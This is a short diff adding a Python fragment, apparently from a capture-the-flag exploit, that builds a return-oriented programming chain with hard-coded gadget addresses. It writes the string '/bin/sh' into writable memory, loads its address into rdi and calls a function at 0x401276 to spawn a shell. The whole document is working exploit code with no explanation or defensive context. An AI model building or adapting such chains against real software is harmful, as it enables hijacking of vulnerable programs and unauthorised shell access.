@@ -1,0 +1,13 @@
+payload = p64(0x402395)
+#0x0000000000402395: pop rbx; pop rbp; ret; 
+payload += p64(0x4281cf)+p64(0x0)+p64(0x40c931)
+# 0x000000000040c931: pop rcx; sbb byte ptr [rbx + 0x41], bl; pop rsi; pop rbp; ret; 
+payload += p64(0x68732f6e69622f)+p64(0x0)+p64(0x0)+p64(0x402395)
+# 0x0000000000402395: pop rbx; pop rbp; ret; 
+payload += p64(0x428070)+p64(0x0)+p64(0x40ded7)
+# 0x000000000040ded7: mov qword ptr [rbx], rcx; add rsp, 8; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x428070)+p64(0x401276)
+# call address 0x401276
+payload += p64(0x401276)
